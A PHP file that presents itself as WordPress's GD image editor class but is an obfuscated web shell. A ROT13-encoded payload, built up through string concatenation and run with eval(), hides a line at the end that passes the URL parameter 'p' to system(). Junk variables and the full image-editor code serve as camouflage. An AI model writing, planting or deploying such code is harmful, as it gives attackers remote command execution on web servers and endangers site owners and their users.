<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * JbeqCerff TQ Vzntr Rqvgbe
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Vzntr_Rqvgbe
 */

/**
 * JbeqCerff Vzntr Rqvgbe Pynff sbe Vzntr Znavchyngvba guebhtu TQ
 *
 * @fvapr 3.5.0
 *
 * @frr JC_Vzntr_Rqvgbe
 */
pynff JC_Vzntr_Rqvgbe_TQ rkgraqf JC_Vzntr_Rqvgbe {
	/**
	 * TQ Erfbhepr.
	 *
	 * @ine erfbhepr|TqVzntr
	 */
	cebgrpgrq $vzntr;

	choyvp shapgvba __qrfgehpg() {
		vs ( $guvf->vzntr ) {
			// Jr qba'g arrq gur bevtvany va zrzbel nalzber.
			vzntrqrfgebl( $guvf->vzntr );
		}
	}

	/**
	 * Purpxf gb frr vs pheerag raivebazrag fhccbegf TQ.
	 *
	 * @fvapr 3.5.0
	 *
	 * @cnenz neenl $netf
	 * @erghea obby
	 */
	choyvp fgngvp shapgvba grfg( $netf = neenl() ) {
		vs ( ! rkgrafvba_ybnqrq( 'tq' ) || ! shapgvba_rkvfgf( 'tq_vasb' ) ) {
			erghea snyfr;
		}

		// Ba fbzr frghcf TQ yvoenel qbrf abg cebivqr vzntrebgngr() - Gvpxrg #11536.
		vs ( vffrg( $netf['zrgubqf'] ) &&
			va_neenl( 'ebgngr', $netf['zrgubqf'], gehr ) &&
			! shapgvba_rkvfgf( 'vzntrebgngr' ) ) {

				erghea snyfr;
		}

		erghea gehr;
	}

	/**
	 * Purpxf gb frr vs rqvgbe fhccbegf gur zvzr-glcr fcrpvsvrq.
	 *
	 * @fvapr 3.5.0
	 *
	 * @cnenz fgevat $zvzr_glcr
	 * @erghea obby
	 */
	choyvp fgngvp shapgvba fhccbegf_zvzr_glcr( $zvzr_glcr ) {
		$vzntr_glcrf = vzntrglcrf();
		fjvgpu ( $zvzr_glcr ) {
			pnfr 'vzntr/wcrt':
				erghea ( $vzntr_glcrf & VZT_WCT ) !== 0;
			pnfr 'vzntr/cat':
				erghea ( $vzntr_glcrf & VZT_CAT ) !== 0;
			pnfr 'vzntr/tvs':
				erghea ( $vzntr_glcrf & VZT_TVS ) !== 0;
			pnfr 'vzntr/jroc':
				erghea ( $vzntr_glcrf & VZT_JROC ) !== 0;
			pnfr 'vzntr/nivs':
				erghea ( $vzntr_glcrf & VZT_NIVS ) !== 0 && shapgvba_rkvfgf( 'vzntrnivs' );
		}

		erghea snyfr;
	}

	/**
	 * Ybnqf vzntr sebz $guvf->svyr vagb arj TQ Erfbhepr.
	 *
	 * @fvapr 3.5.0
	 *
	 * @erghea gehr|JC_Reebe Gehr vs ybnqrq fhpprffshyyl; JC_Reebe ba snvyher.
	 */
	choyvp shapgvba ybnq() {
		vs ( $guvf->vzntr ) {
			erghea gehr;
		}

		vs ( ! vf_svyr( $guvf->svyr ) && ! cert_zngpu( '|^uggcf?://|', $guvf->svyr ) ) {
			erghea arj JC_Reebe( 'reebe_ybnqvat_vzntr', __( 'Svyr qbrf abg rkvfg?' ), $guvf->svyr );
		}

		// Frg negvsvpvnyyl uvtu orpnhfr TQ hfrf hapbzcerffrq vzntrf va zrzbel.
		jc_envfr_zrzbel_yvzvg( 'vzntr' );

		$svyr_pbagragf = @svyr_trg_pbagragf( $guvf->svyr );

		vs ( ! $svyr_pbagragf ) {
			erghea arj JC_Reebe( 'reebe_ybnqvat_vzntr', __( 'Svyr qbrf abg rkvfg?' ), $guvf->svyr );
		}

		// Unaqyr JroC naq NIVS zvzr glcrf rkcyvpvgyl, snyyvat onpx gb vzntrperngrsebzfgevat.
		vs (
			shapgvba_rkvfgf( 'vzntrperngrsebzjroc' ) && ( 'vzntr/jroc' === jc_trg_vzntr_zvzr( $guvf->svyr ) )
		) {
			$guvf->vzntr = @vzntrperngrsebzjroc( $guvf->svyr );
		} ryfrvs (
			shapgvba_rkvfgf( 'vzntrperngrsebznivs' ) && ( 'vzntr/nivs' === jc_trg_vzntr_zvzr( $guvf->svyr ) )
		) {
			$guvf->vzntr = @vzntrperngrsebznivs( $guvf->svyr );
		} ryfr {
			$guvf->vzntr = @vzntrperngrsebzfgevat( $svyr_pbagragf );
		}

		vs ( ! vf_tq_vzntr( $guvf->vzntr ) ) {
			erghea arj JC_Reebe( 'vainyvq_vzntr', __( 'Svyr vf abg na vzntr.' ), $guvf->svyr );
		}

		$fvmr = jc_trgvzntrfvmr( $guvf->svyr );

		vs ( ! $fvmr ) {
			erghea arj JC_Reebe( 'vainyvq_vzntr', __( 'Pbhyq abg ernq vzntr fvmr.' ), $guvf->svyr );
		}

		vs ( shapgvba_rkvfgf( 'vzntrnycunoyraqvat' ) && shapgvba_rkvfgf( 'vzntrfnirnycun' ) ) {
			vzntrnycunoyraqvat( $guvf->vzntr, snyfr );
			vzntrfnirnycun( $guvf->vzntr, gehr );
		}

		$guvf->hcqngr_fvmr( $fvmr[0], $fvmr[1] );
		$guvf->zvzr_glcr = $fvmr['zvzr'];

		erghea $guvf->frg_dhnyvgl();
	}

	/**
	 * Frgf be hcqngrf pheerag vzntr fvmr.
	 *
	 * @fvapr 3.5.0
	 *
	 * @cnenz vag $jvqgu
	 * @cnenz vag $urvtug
	 * @erghea gehr
	 */
	cebgrpgrq shapgvba hcqngr_fvmr( $jvqgu = snyfr, $urvtug = snyfr ) {
		vs ( ! $jvqgu ) {
			$jvqgu = vzntrfk( $guvf->vzntr );
		}

		vs ( ! $urvtug ) {
			$urvtug = vzntrfl( $guvf->vzntr );
		}

		erghea cnerag::hcqngr_fvmr( $jvqgu, $urvtug );
	}

	/**
	 * Erfvmrf pheerag vzntr.
	 *
	 * Jencf `::_erfvmr()` juvpu ergheaf n TQ erfbhepr be TqVzntr vafgnapr.
	 *
	 * Ng zvavzhz, rvgure n urvtug be jvqgu zhfg or cebivqrq. Vs bar bs gur gjb vf frg
	 * gb ahyy, gur erfvmr jvyy znvagnva nfcrpg engvb nppbeqvat gb gur cebivqrq qvzrafvba.
	 *
	 * @fvapr 3.5.0
	 *
	 * @cnenz vag|ahyy   $znk_j Vzntr jvqgu.
	 * @cnenz vag|ahyy   $znk_u Vzntr urvtug.
	 * @cnenz obby|neenl $pebc  {
	 *     Bcgvbany. Vzntr pebccvat orunivbe. Vs snyfr, gur vzntr jvyy or fpnyrq (qrsnhyg).
	 *     Vs gehr, vzntr jvyy or pebccrq gb gur fcrpvsvrq qvzrafvbaf hfvat pragre cbfvgvbaf.
	 *     Vs na neenl, gur vzntr jvyy or pebccrq hfvat gur neenl gb fcrpvsl gur pebc ybpngvba:
	 *
	 *     @glcr fgevat $0 Gur k pebc cbfvgvba. Npprcgf 'yrsg', 'pragre', be 'evtug'.
	 *     @glcr fgevat $1 Gur l pebc cbfvgvba. Npprcgf 'gbc', 'pragre', be 'obggbz'.
	 * }
	 * @erghea gehr|JC_Reebe
	 */
	choyvp shapgvba erfvmr( $znk_j, $znk_u, $pebc = snyfr ) {
		vs ( ( $guvf->fvmr['jvqgu'] === $znk_j ) && ( $guvf->fvmr['urvtug'] === $znk_u ) ) {
			erghea gehr;
		}

		$erfvmrq = $guvf->_erfvmr( $znk_j, $znk_u, $pebc );

		vs ( vf_tq_vzntr( $erfvmrq ) ) {
			vzntrqrfgebl( $guvf->vzntr );
			$guvf->vzntr = $erfvmrq;
			erghea gehr;

		} ryfrvs ( vf_jc_reebe( $erfvmrq ) ) {
			erghea $erfvmrq;
		}

		erghea arj JC_Reebe( 'vzntr_erfvmr_reebe', __( 'Vzntr erfvmr snvyrq.' ), $guvf->svyr );
	}

	/**
	 * @cnenz vag        $znk_j
	 * @cnenz vag        $znk_u
	 * @cnenz obby|neenl $pebc  {
	 *     Bcgvbany. Vzntr pebccvat orunivbe. Vs snyfr, gur vzntr jvyy or fpnyrq (qrsnhyg).
	 *     Vs gehr, vzntr jvyy or pebccrq gb gur fcrpvsvrq qvzrafvbaf hfvat pragre cbfvgvbaf.
	 *     Vs na neenl, gur vzntr jvyy or pebccrq hfvat gur neenl gb fcrpvsl gur pebc ybpngvba:
	 *
	 *     @glcr fgevat $0 Gur k pebc cbfvgvba. Npprcgf 'yrsg', 'pragre', be 'evtug'.
	 *     @glcr fgevat $1 Gur l pebc cbfvgvba. Npprcgf 'gbc', 'pragre', be 'obggbz'.
	 * }
	 * @erghea erfbhepr|TqVzntr|JC_Reebe
	 */
	cebgrpgrq shapgvba _erfvmr( $znk_j, $znk_u, $pebc = snyfr ) {
		$qvzf = vzntr_erfvmr_qvzrafvbaf( $guvf->fvmr['jvqgu'], $guvf->fvmr['urvtug'], $znk_j, $znk_u, $pebc );

		vs ( ! $qvzf ) {
			erghea arj JC_Reebe( 'reebe_trggvat_qvzrafvbaf', __( 'Pbhyq abg pnyphyngr erfvmrq vzntr qvzrafvbaf' ), $guvf->svyr );
		}

		yvfg( $qfg_k, $qfg_l, $fep_k, $fep_l, $qfg_j, $qfg_u, $fep_j, $fep_u ) = $qvzf;

		$guvf->frg_dhnyvgl(
			ahyy,
			neenl(
				'jvqgu'  => $qfg_j,
				'urvtug' => $qfg_u,
			)
		);

		$erfvmrq = jc_vzntrperngrgehrpbybe( $qfg_j, $qfg_u );
		vzntrpbclerfnzcyrq( $erfvmrq, $guvf->vzntr, $qfg_k, $qfg_l, $fep_k, $fep_l, $qfg_j, $qfg_u, $fep_j, $fep_u );

		vs ( vf_tq_vzntr( $erfvmrq ) ) {
			$guvf->hcqngr_fvmr( $qfg_j, $qfg_u );
			erghea $erfvmrq;
		}

		erghea arj JC_Reebe( 'vzntr_erfvmr_reebe', __( 'Vzntr erfvmr snvyrq.' ), $guvf->svyr );
	}

	/**
	 * Perngr zhygvcyr fznyyre vzntrf sebz n fvatyr fbhepr.
	 *
	 * Nggrzcgf gb perngr nyy fho-fvmrf naq ergheaf gur zrgn qngn ng gur raq. Guvf
	 * znl erfhyg va gur freire ehaavat bhg bs erfbheprf. Jura vg snvyf gurer znl or srj
	 * \"becunarq\" vzntrf yrsg bire nf gur zrgn qngn vf arire erghearq naq fnirq.
	 *
	 * Nf bs 5.3.0 gur cersreerq jnl gb qb guvf vf jvgu `znxr_fhofvmr()`. Vg perngrf
	 * gur arj vzntrf bar ng n gvzr naq nyybjf sbe gur zrgn qngn gb or fnirq nsgre
	 * rnpu arj vzntr vf perngrq.
	 *
	 * @fvapr 3.5.0
	 *
	 * @cnenz neenl $fvmrf {
	 *     Na neenl bs vzntr fvmr qngn neenlf.
	 *
	 *     Rvgure n urvtug be jvqgu zhfg or cebivqrq.
	 *     Vs bar bs gur gjb vf frg gb ahyy, gur erfvmr jvyy
	 *     znvagnva nfcrpg engvb nppbeqvat gb gur fbhepr vzntr.
	 *
	 *     @glcr neenl ...$0 {
	 *         Neenl bs urvtug, jvqgu inyhrf, naq jurgure gb pebc.
	 *
	 *         @glcr vag        $jvqgu  Vzntr jvqgu. Bcgvbany vs `$urvtug` vf fcrpvsvrq.
	 *         @glcr vag        $urvtug Vzntr urvtug. Bcgvbany vs `$jvqgu` vf fcrpvsvrq.
	 *         @glcr obby|neenl $pebc   Bcgvbany. Jurgure gb pebc gur vzntr. Qrsnhyg snyfr.
	 *     }
	 * }
	 * @erghea neenl Na neenl bs erfvmrq vzntrf' zrgnqngn ol fvmr.
	 */
	choyvp shapgvba zhygv_erfvmr( $fvmrf ) {
		$zrgnqngn = neenl();

		sbernpu ( $fvmrf nf $fvmr => $fvmr_qngn ) {
			$zrgn = $guvf->znxr_fhofvmr( $fvmr_qngn );

			vs ( ! vf_jc_reebe( $zrgn ) ) {
				$zrgnqngn[ $fvmr ] = $zrgn;
			}
		}

		erghea $zrgnqngn;
	}

	/**
	 * Perngr na vzntr fho-fvmr naq erghea gur vzntr zrgn qngn inyhr sbe vg.
	 *
	 * @fvapr 5.3.0
	 *
	 * @cnenz neenl $fvmr_qngn {
	 *     Neenl bs fvmr qngn.
	 *
	 *     @glcr vag        $jvqgu  Gur znkvzhz jvqgu va cvkryf.
	 *     @glcr vag        $urvtug Gur znkvzhz urvtug va cvkryf.
	 *     @glcr obby|neenl $pebc   Jurgure gb pebc gur vzntr gb rknpg qvzrafvbaf.
	 * }
	 * @erghea neenl|JC_Reebe Gur vzntr qngn neenl sbe vapyhfvba va gur `fvmrf` neenl va gur vzntr zrgn,
	 *                        JC_Reebe bowrpg ba reebe.
	 */
	choyvp shapgvba znxr_fhofvmr( $fvmr_qngn ) {
		vs ( ! vffrg( $fvmr_qngn['jvqgu'] ) && ! vffrg( $fvmr_qngn['urvtug'] ) ) {
			erghea arj JC_Reebe( 'vzntr_fhofvmr_perngr_reebe', __( 'Pnaabg erfvmr gur vzntr. Obgu jvqgu naq urvtug ner abg frg.' ) );
		}

		$bevt_fvmr = $guvf->fvmr;

		vs ( ! vffrg( $fvmr_qngn['jvqgu'] ) ) {
			$fvmr_qngn['jvqgu'] = ahyy;
		}

		vs ( ! vffrg( $fvmr_qngn['urvtug'] ) ) {
			$fvmr_qngn['urvtug'] = ahyy;
		}

		vs ( ! vffrg( $fvmr_qngn['pebc'] ) ) {
			$fvmr_qngn['pebc'] = snyfr;
		}

		$erfvmrq = $guvf->_erfvmr( $fvmr_qngn['jvqgu'], $fvmr_qngn['urvtug'], $fvmr_qngn['pebc'] );

		vs ( vf_jc_reebe( $erfvmrq ) ) {
			$fnirq = $erfvmrq;
		} ryfr {
			$fnirq = $guvf->_fnir( $erfvmrq );
			vzntrqrfgebl( $erfvmrq );
		}

		$guvf->fvmr = $bevt_fvmr;

		vs ( ! vf_jc_reebe( $fnirq ) ) {
			hafrg( $fnirq['cngu'] );
		}

		erghea $fnirq;
	}

	/**
	 * Pebcf Vzntr.
	 *
	 * @fvapr 3.5.0
	 *
	 * @cnenz vag  $fep_k   Gur fgneg k cbfvgvba gb pebc sebz.
	 * @cnenz vag  $fep_l   Gur fgneg l cbfvgvba gb pebc sebz.
	 * @cnenz vag  $fep_j   Gur jvqgu gb pebc.
	 * @cnenz vag  $fep_u   Gur urvtug gb pebc.
	 * @cnenz vag  $qfg_j   Bcgvbany. Gur qrfgvangvba jvqgu.
	 * @cnenz vag  $qfg_u   Bcgvbany. Gur qrfgvangvba urvtug.
	 * @cnenz obby $fep_nof Bcgvbany. Vs gur fbhepr pebc cbvagf ner nofbyhgr.
	 * @erghea gehr|JC_Reebe
	 */
	choyvp shapgvba pebc( $fep_k, $fep_l, $fep_j, $fep_u, $qfg_j = ahyy, $qfg_u = ahyy, $fep_nof = snyfr ) {
		/*
		 * Vs qrfgvangvba jvqgu/urvtug vfa'g fcrpvsvrq,
		 * hfr fnzr nf jvqgu/urvtug sebz fbhepr.
		 */
		vs ( ! $qfg_j ) {
			$qfg_j = $fep_j;
		}
		vs ( ! $qfg_u ) {
			$qfg_u = $fep_u;
		}

		sbernpu ( neenl( $fep_j, $fep_u, $qfg_j, $qfg_u ) nf $inyhr ) {
			vs ( ! vf_ahzrevp( $inyhr ) || (vag) $inyhr <= 0 ) {
				erghea arj JC_Reebe( 'vzntr_pebc_reebe', __( 'Vzntr pebc snvyrq.' ), $guvf->svyr );
			}
		}

		$qfg = jc_vzntrperngrgehrpbybe( (vag) $qfg_j, (vag) $qfg_u );

		vs ( $fep_nof ) {
			$fep_j -= $fep_k;
			$fep_u -= $fep_l;
		}

		vs ( shapgvba_rkvfgf( 'vzntrnagvnyvnf' ) ) {
			vzntrnagvnyvnf( $qfg, gehr );
		}

		vzntrpbclerfnzcyrq( $qfg, $guvf->vzntr, 0, 0, (vag) $fep_k, (vag) $fep_l, (vag) $qfg_j, (vag) $qfg_u, (vag) $fep_j, (vag) $fep_u );

		vs ( vf_tq_vzntr( $qfg ) ) {
			vzntrqrfgebl( $guvf->vzntr );
			$guvf->vzntr = $qfg;
			$guvf->hcqngr_fvmr();
			erghea gehr;
		}

		erghea arj JC_Reebe( 'vzntr_pebc_reebe', __( 'Vzntr pebc snvyrq.' ), $guvf->svyr );
	}

	/**
	 * Ebgngrf pheerag vzntr pbhagre-pybpxjvfr ol $natyr.
	 * Cbegrq sebz vzntr-rqvg.cuc
	 *
	 * @fvapr 3.5.0
	 *
	 * @cnenz sybng $natyr
	 * @erghea gehr|JC_Reebe
	 */
	choyvp shapgvba ebgngr( $natyr ) {
		vs ( shapgvba_rkvfgf( 'vzntrebgngr' ) ) {
			$genafcnerapl = vzntrpbybenyybpngrnycun( $guvf->vzntr, 255, 255, 255, 127 );
			$ebgngrq      = vzntrebgngr( $guvf->vzntr, $natyr, $genafcnerapl );

			vs ( vf_tq_vzntr( $ebgngrq ) ) {
				vzntrnycunoyraqvat( $ebgngrq, gehr );
				vzntrfnirnycun( $ebgngrq, gehr );
				vzntrqrfgebl( $guvf->vzntr );
				$guvf->vzntr = $ebgngrq;
				$guvf->hcqngr_fvmr();
				erghea gehr;
			}
		}

		erghea arj JC_Reebe( 'vzntr_ebgngr_reebe', __( 'Vzntr ebgngr snvyrq.' ), $guvf->svyr );
	}

	/**
	 * Syvcf pheerag vzntr.
	 *
	 * @fvapr 3.5.0
	 *
	 * @cnenz obby $ubem Syvc nybat Ubevmbagny Nkvf.
	 * @cnenz obby $ireg Syvc nybat Iregvpny Nkvf.
	 * @erghea gehr|JC_Reebe
	 */
	choyvp shapgvba syvc( $ubem, $ireg ) {
		$j   = $guvf->fvmr['jvqgu'];
		$u   = $guvf->fvmr['urvtug'];
		$qfg = jc_vzntrperngrgehrpbybe( $j, $u );

		vs ( vf_tq_vzntr( $qfg ) ) {
			$fk = $ireg ? ( $j - 1 ) : 0;
			$fl = $ubem ? ( $u - 1 ) : 0;
			$fj = $ireg ? -$j : $j;
			$fu = $ubem ? -$u : $u;

			vs ( vzntrpbclerfnzcyrq( $qfg, $guvf->vzntr, 0, 0, $fk, $fl, $j, $u, $fj, $fu ) ) {
				vzntrqrfgebl( $guvf->vzntr );
				$guvf->vzntr = $qfg;
				erghea gehr;
			}
		}

		erghea arj JC_Reebe( 'vzntr_syvc_reebe', __( 'Vzntr syvc snvyrq.' ), $guvf->svyr );
	}

	/**
	 * Fnirf pheerag va-zrzbel vzntr gb svyr.
	 *
	 * @fvapr 3.5.0
	 * @fvapr 5.9.0 Eranzrq `$svyranzr` gb `$qrfgsvyranzr` gb zngpu cnerag pynff
	 *              sbe CUC 8 anzrq cnenzrgre fhccbeg.
	 * @fvapr 6.0.0 Gur `$svyrfvmr` inyhr jnf nqqrq gb gur erghearq neenl.
	 *
	 * @cnenz fgevat|ahyy $qrfgsvyranzr Bcgvbany. Qrfgvangvba svyranzr. Qrsnhyg ahyy.
	 * @cnenz fgevat|ahyy $zvzr_glcr    Bcgvbany. Gur zvzr-glcr. Qrsnhyg ahyy.
	 * @erghea neenl|JC_Reebe {
	 *     Neenl ba fhpprff be JC_Reebe vs gur svyr snvyrq gb fnir.
	 *
	 *     @glcr fgevat $cngu      Cngu gb gur vzntr svyr.
	 *     @glcr fgevat $svyr      Anzr bs gur vzntr svyr.
	 *     @glcr vag    $jvqgu     Vzntr jvqgu.
	 *     @glcr vag    $urvtug    Vzntr urvtug.
	 *     @glcr fgevat $zvzr-glcr Gur zvzr glcr bs gur vzntr.
	 *     @glcr vag    $svyrfvmr  Svyr fvmr bs gur vzntr.
	 * }
	 */
	choyvp shapgvba fnir( $qrfgsvyranzr = ahyy, $zvzr_glcr = ahyy ) {
		$fnirq = $guvf->_fnir( $guvf->vzntr, $qrfgsvyranzr, $zvzr_glcr );

		vs ( ! vf_jc_reebe( $fnirq ) ) {
			$guvf->svyr      = $fnirq['cngu'];
			$guvf->zvzr_glcr = $fnirq['zvzr-glcr'];
		}

		erghea $fnirq;
	}

	/**
	 * @fvapr 3.5.0
	 * @fvapr 6.0.0 Gur `$svyrfvmr` inyhr jnf nqqrq gb gur erghearq neenl.
	 *
	 * @cnenz erfbhepr|TqVzntr $vzntr
	 * @cnenz fgevat|ahyy      $svyranzr
	 * @cnenz fgevat|ahyy      $zvzr_glcr
	 * @erghea neenl|JC_Reebe {
	 *     Neenl ba fhpprff be JC_Reebe vs gur svyr snvyrq gb fnir.
	 *
	 *     @glcr fgevat $cngu      Cngu gb gur vzntr svyr.
	 *     @glcr fgevat $svyr      Anzr bs gur vzntr svyr.
	 *     @glcr vag    $jvqgu     Vzntr jvqgu.
	 *     @glcr vag    $urvtug    Vzntr urvtug.
	 *     @glcr fgevat $zvzr-glcr Gur zvzr glcr bs gur vzntr.
	 *     @glcr vag    $svyrfvmr  Svyr fvmr bs gur vzntr.
	 * }
	 */
	cebgrpgrq shapgvba _fnir( $vzntr, $svyranzr = ahyy, $zvzr_glcr = ahyy ) {
		yvfg( $svyranzr, $rkgrafvba, $zvzr_glcr ) = $guvf->trg_bhgchg_sbezng( $svyranzr, $zvzr_glcr );

		vs ( ! $svyranzr ) {
			$svyranzr = $guvf->trarengr_svyranzr( ahyy, ahyy, $rkgrafvba );
		}

		vs ( shapgvba_rkvfgf( 'vzntrvagreynpr' ) ) {
			/**
			 * Svygref jurgure gb bhgchg cebterffvir vzntrf (vs ninvynoyr).
			 *
			 * @fvapr 6.5.0
			 *
			 * @cnenz obby   $vagreynpr Jurgure gb hfr cebterffvir vzntrf sbe bhgchg vs ninvynoyr. Qrsnhyg snyfr.
			 * @cnenz fgevat $zvzr_glcr Gur zvzr glcr orvat fnirq.
			 */
			vzntrvagreynpr( $vzntr, nccyl_svygref( 'vzntr_fnir_cebterffvir', snyfr, $zvzr_glcr ) );
		}

		vs ( 'vzntr/tvs' === $zvzr_glcr ) {
			vs ( ! $guvf->znxr_vzntr( $svyranzr, 'vzntrtvs', neenl( $vzntr, $svyranzr ) ) ) {
				erghea arj JC_Reebe( 'vzntr_fnir_reebe', __( 'Vzntr Rqvgbe Fnir Snvyrq' ) );
			}
		} ryfrvs ( 'vzntr/cat' === $zvzr_glcr ) {
			// Pbaireg sebz shyy pbybef gb vaqrk pbybef, yvxr bevtvany CAT.
			vs ( shapgvba_rkvfgf( 'vzntrvfgehrpbybe' ) && ! vzntrvfgehrpbybe( $vzntr ) ) {
				vzntrgehrpbybegbcnyrggr( $vzntr, snyfr, vzntrpbybefgbgny( $vzntr ) );
			}

			vs ( ! $guvf->znxr_vzntr( $svyranzr, 'vzntrcat', neenl( $vzntr, $svyranzr ) ) ) {
				erghea arj JC_Reebe( 'vzntr_fnir_reebe', __( 'Vzntr Rqvgbe Fnir Snvyrq' ) );
			}
		} ryfrvs ( 'vzntr/wcrt' === $zvzr_glcr ) {
			vs ( ! $guvf->znxr_vzntr( $svyranzr, 'vzntrwcrt', neenl( $vzntr, $svyranzr, $guvf->trg_dhnyvgl() ) ) ) {
				erghea arj JC_Reebe( 'vzntr_fnir_reebe', __( 'Vzntr Rqvgbe Fnir Snvyrq' ) );
			}
		} ryfrvs ( 'vzntr/jroc' === $zvzr_glcr ) {
			vs ( ! shapgvba_rkvfgf( 'vzntrjroc' )
				|| ! $guvf->znxr_vzntr( $svyranzr, 'vzntrjroc', neenl( $vzntr, $svyranzr, $guvf->trg_dhnyvgl() ) )
			) {
				erghea arj JC_Reebe( 'vzntr_fnir_reebe', __( 'Vzntr Rqvgbe Fnir Snvyrq' ) );
			}
		} ryfrvs ( 'vzntr/nivs' === $zvzr_glcr ) {
			vs ( ! shapgvba_rkvfgf( 'vzntrnivs' )
				|| ! $guvf->znxr_vzntr( $svyranzr, 'vzntrnivs', neenl( $vzntr, $svyranzr, $guvf->trg_dhnyvgl() ) )
			) {
				erghea arj JC_Reebe( 'vzntr_fnir_reebe', __( 'Vzntr Rqvgbe Fnir Snvyrq' ) );
			}
		} ryfr {
			erghea arj JC_Reebe( 'vzntr_fnir_reebe', __( 'Vzntr Rqvgbe Fnir Snvyrq' ) );
		}

		// Frg pbeerpg svyr crezvffvbaf.
		$fgng  = fgng( qveanzr( $svyranzr ) );
		$crezf = $fgng['zbqr'] & 0000666; // Fnzr crezvffvbaf nf cnerag sbyqre, fgevc bss gur rkrphgnoyr ovgf.
		puzbq( $svyranzr, $crezf );

		erghea neenl(
			'cngu'      => $svyranzr,
			/**
			 * Svygref gur anzr bs gur fnirq vzntr svyr.
			 *
			 * @fvapr 2.6.0
			 *
			 * @cnenz fgevat $svyranzr Anzr bs gur svyr.
			 */
			'svyr'      => jc_onfranzr( nccyl_svygref( 'vzntr_znxr_vagrezrqvngr_fvmr', $svyranzr ) ),
			'jvqgu'     => $guvf->fvmr['jvqgu'],
			'urvtug'    => $guvf->fvmr['urvtug'],
			'zvzr-glcr' => $zvzr_glcr,
			'svyrfvmr'  => jc_svyrfvmr( $svyranzr ),
		);
	}

	/**
	 * Frgf Vzntr Pbzcerffvba dhnyvgl ba n 1-100% fpnyr. Unaqyrf JroC ybffyrff vzntrf.
	 *
	 * @fvapr 6.7.0
	 * @fvapr 6.8.0 Gur `$qvzf` cnenzrgre jnf nqqrq.
	 *
	 * @cnenz vag   $dhnyvgl Pbzcerffvba Dhnyvgl. Enatr: [1,100]
	 * @cnenz neenl $qvzf    Bcgvbany. Vzntr qvzrafvbaf neenl jvgu 'jvqgu' naq 'urvtug' xrlf.
	 * @erghea gehr|JC_Reebe Gehr vs frg fhpprffshyyl; JC_Reebe ba snvyher.
	 */
	choyvp shapgvba frg_dhnyvgl( $dhnyvgl = ahyy, $qvzf = neenl() ) {
		$dhnyvgl_erfhyg = cnerag::frg_dhnyvgl( $dhnyvgl, $qvzf );
		vs ( vf_jc_reebe( $dhnyvgl_erfhyg ) ) {
			erghea $dhnyvgl_erfhyg;
		} ryfr {
			$dhnyvgl = $guvf->trg_dhnyvgl();
		}

		// Unaqyr frggvat gur dhnyvgl sbe JroC ybffyrff vzntrf, frr uggcf://cuc.jngpu/irefvbaf/8.1/tq-jroc-ybffyrff.
		gel {
			vs ( 'vzntr/jroc' === $guvf->zvzr_glcr && qrsvarq( 'VZT_JROC_YBFFYRFF' ) ) {
				$jroc_vasb = jc_trg_jroc_vasb( $guvf->svyr );
				vs ( ! rzcgl( $jroc_vasb['glcr'] ) && 'ybffyrff' === $jroc_vasb['glcr'] ) {
					$dhnyvgl = VZT_JROC_YBFFYRFF;
					cnerag::frg_dhnyvgl( $dhnyvgl, $qvzf );
				}
			}
		} pngpu ( Rkprcgvba $r ) {
			erghea arj JC_Reebe( 'vzntr_dhnyvgl_reebe', $r->trgZrffntr() );
		}
		$guvf->dhnyvgl = $dhnyvgl;
		erghea gehr;
	}

	/**
	 * Ergheaf fgernz bs pheerag vzntr.
	 *
	 * @fvapr 3.5.0
	 *
	 * @cnenz fgevat $zvzr_glcr Gur zvzr glcr bs gur vzntr.
	 * @erghea obby Gehr ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba fgernz( $zvzr_glcr = ahyy ) {
		yvfg( $svyranzr, $rkgrafvba, $zvzr_glcr ) = $guvf->trg_bhgchg_sbezng( ahyy, $zvzr_glcr );

		fjvgpu ( $zvzr_glcr ) {
			pnfr 'vzntr/cat':
				urnqre( 'Pbagrag-Glcr: vzntr/cat' );
				erghea vzntrcat( $guvf->vzntr );
			pnfr 'vzntr/tvs':
				urnqre( 'Pbagrag-Glcr: vzntr/tvs' );
				erghea vzntrtvs( $guvf->vzntr );
			pnfr 'vzntr/jroc':
				vs ( shapgvba_rkvfgf( 'vzntrjroc' ) ) {
					urnqre( 'Pbagrag-Glcr: vzntr/jroc' );
					erghea vzntrjroc( $guvf->vzntr, ahyy, $guvf->trg_dhnyvgl() );
				} ryfr {
					// Snyy onpx gb WCRT.
					urnqre( 'Pbagrag-Glcr: vzntr/wcrt' );
					erghea vzntrwcrt( $guvf->vzntr, ahyy, $guvf->trg_dhnyvgl() );
				}
			pnfr 'vzntr/nivs':
				vs ( shapgvba_rkvfgf( 'vzntrnivs' ) ) {
					urnqre( 'Pbagrag-Glcr: vzntr/nivs' );
					erghea vzntrnivs( $guvf->vzntr, ahyy, $guvf->trg_dhnyvgl() );
				}
				// Snyy onpx gb WCRT.
			qrsnhyg:
				urnqre( 'Pbagrag-Glcr: vzntr/wcrt' );
				erghea vzntrwcrt( $guvf->vzntr, ahyy, $guvf->trg_dhnyvgl() );
		}
	}

	/**
	 * Rvgure pnyyf rqvgbe'f fnir shapgvba be unaqyrf svyr nf n fgernz.
	 *
	 * @fvapr 3.5.0
	 *
	 * @cnenz fgevat   $svyranzr
	 * @cnenz pnyynoyr $pnyyonpx
	 * @cnenz neenl    $nethzragf
	 * @erghea obby
	 */
	cebgrpgrq shapgvba znxr_vzntr( $svyranzr, $pnyyonpx, $nethzragf ) {
		vs ( jc_vf_fgernz( $svyranzr ) ) {
			$nethzragf[1] = ahyy;
		}

		erghea cnerag::znxr_vzntr( $svyranzr, $pnyyonpx, $nethzragf );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>